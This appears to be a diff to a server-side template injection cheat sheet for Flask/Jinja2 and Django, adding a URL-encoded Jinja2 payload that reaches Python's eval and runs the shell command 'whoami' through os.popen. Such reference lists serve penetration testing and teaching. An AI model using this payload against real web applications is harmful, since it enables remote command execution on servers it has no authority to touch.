@@ -32,6 +32,8 @@
 - Flask/Jinja2
     - ``{{ config.items() }}``
     - ``{{''.__class__.__mro__[-1].__subclasses__()}}``
+	- 示例
+		+ {{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)}}
 - Django
     - ``{{ request }}``
     - ``{% debug %}``
